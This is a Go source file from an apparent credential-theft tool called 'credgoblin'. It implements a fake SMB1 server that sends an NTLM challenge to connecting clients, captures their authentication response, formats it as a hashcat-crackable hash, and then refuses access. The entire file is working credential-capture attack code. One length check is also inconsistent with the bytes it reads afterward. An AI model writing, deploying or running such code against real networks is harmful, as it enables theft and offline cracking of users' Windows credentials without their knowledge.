package smb

import (
	"bytes"
	"encoding/binary"
	"fmt"

	"github.com/ineffectivecoder/credgoblin/pkg/ntlm"
)

// BuildSMB1SessionSetupResponse builds an SMB1 SESSION_SETUP_ANDX response
func BuildSMB1SessionSetupResponse(reqHeader *SMB1Header, status uint32, uid uint16, securityBlob []byte) []byte {
	// Build response header
	header := &SMB1Header{
		Protocol: [4]byte{0xFF, 'S', 'M', 'B'},
		Command:  SMB_COM_SESSION_SETUP_ANDX,
		Status:   status,
		Flags:    SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED | SMB_FLAGS_REPLY,
		Flags2:   SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EXTENDED_SECURITY | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE,
		PIDHigh:  reqHeader.PIDHigh,
		TID:      reqHeader.TID,
		PID:      reqHeader.PID,
		UID:      uid,
		MID:      reqHeader.MID,
	}

	headerBytes := BuildSMB1Header(header)

	// Build SESSION_SETUP_ANDX response parameters
	var params bytes.Buffer

	// WordCount
	params.WriteByte(4)

	// AndXCommand (no further commands)
	params.WriteByte(0xFF)

	// AndXReserved
	params.WriteByte(0)

	// AndXOffset
	binary.Write(&params, binary.LittleEndian, uint16(0))

	// Action flags (0 = not guest)
	binary.Write(&params, binary.LittleEndian, uint16(0))

	// SecurityBlobLength
	binary.Write(&params, binary.LittleEndian, uint16(len(securityBlob)))

	// Build data section
	var data bytes.Buffer

	// Security Blob
	data.Write(securityBlob)

	// NativeOS (Unicode)
	nativeOS := encodeUnicode("Unix")
	data.Write(nativeOS)
	data.Write([]byte{0, 0}) // Null terminator

	// NativeLanMan (Unicode)
	nativeLM := encodeUnicode("Samba")
	data.Write(nativeLM)
	data.Write([]byte{0, 0}) // Null terminator

	// ByteCount
	byteCount := uint16(data.Len())
	var byteCountBuf bytes.Buffer
	binary.Write(&byteCountBuf, binary.LittleEndian, byteCount)

	// Combine all parts
	response := append(headerBytes, params.Bytes()...)
	response = append(response, byteCountBuf.Bytes()...)
	response = append(response, data.Bytes()...)

	return response
}

// HandleSMB1SessionSetup handles an SMB1 SESSION_SETUP_ANDX request with NTLMSSP
func HandleSMB1SessionSetup(
	reqHeader *SMB1Header,
	data []byte,
	challengeGen *ntlm.Challenge,
	authParser *ntlm.AuthMessageParser,
	hashFormatter *ntlm.HashcatFormatter,
	sessionState *SessionState,
) ([]byte, string, error) {
	if len(data) < 33 {
		return nil, "", ErrInvalidPacket
	}

	// WordCount
	wordCount := data[32]
	if wordCount < 12 {
		return nil, "", fmt.Errorf("invalid SESSION_SETUP_ANDX wordcount: %d", wordCount)
	}

	// Parse parameters
	offset := 33

	// Skip AndXCommand, AndXReserved, AndXOffset (4 bytes)
	offset += 4

	// MaxBufferSize (2 bytes)
	offset += 2

	// MaxMpxCount (2 bytes)
	offset += 2

	// VcNumber (2 bytes)
	offset += 2

	// SessionKey (4 bytes)
	offset += 4

	// SecurityBlobLength (2 bytes)
	if len(data) < offset+2 {
		return nil, "", ErrInvalidPacket
	}
	securityBlobLength := binary.LittleEndian.Uint16(data[offset : offset+2])
	offset += 2

	// Skip Reserved (4 bytes)
	offset += 4

	// Capabilities (4 bytes)
	offset += 4

	// ByteCount (2 bytes)
	if len(data) < offset+2 {
		return nil, "", ErrInvalidPacket
	}
	offset += 2

	// Extract SecurityBlob
	if len(data) < offset+int(securityBlobLength) {
		return nil, "", ErrInvalidPacket
	}
	securityBlob := data[offset : offset+int(securityBlobLength)]

	// Unwrap SPNEGO
	ntlmMessage, err := unwrapSPNEGO(securityBlob)
	if err != nil {
		return nil, "", fmt.Errorf("failed to unwrap SPNEGO: %w", err)
	}

	// Determine message type
	if len(ntlmMessage) < 8 {
		return nil, "", fmt.Errorf("NTLM message too short")
	}

	messageType := binary.LittleEndian.Uint32(ntlmMessage[8:12])

	switch messageType {
	case ntlm.NtLmNegotiate:
		// Type 1: Send challenge
		challenge := challengeGen.Generate()
		sessionState.Challenge = challenge

		// Wrap in SPNEGO
		wrappedChallenge := wrapNTLMInSPNEGO(challenge.Bytes(), true)

		// Send MORE_PROCESSING_REQUIRED
		response := BuildSMB1SessionSetupResponse(
			reqHeader,
			STATUS_MORE_PROCESSING_REQUIRED,
			0, // UID not assigned yet
			wrappedChallenge,
		)

		return response, "", nil

	case ntlm.NtLmAuthenticate:
		// Type 3: Parse auth and capture hash
		authInfo, err := authParser.Parse(ntlmMessage)
		if err != nil {
			return nil, "", fmt.Errorf("failed to parse NTLM auth: %w", err)
		}

		// Format hash
		var hash string
		if sessionState.Challenge != nil {
			hash = hashFormatter.FormatHashcatFromChallenge(sessionState.Challenge, authInfo)
		}

		// Send ACCESS_DENIED to disconnect gracefully
		response := BuildSMB1SessionSetupResponse(
			reqHeader,
			STATUS_ACCESS_DENIED,
			1, // Assign UID
			nil,
		)

		return response, hash, nil

	default:
		return nil, "", fmt.Errorf("unexpected NTLM message type: %d", messageType)
	}
}

// encodeUnicode converts a string to UTF-16LE
func encodeUnicode(s string) []byte {
	runes := []rune(s)
	result := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(result[i*2:], uint16(r))
	}
	return result
}
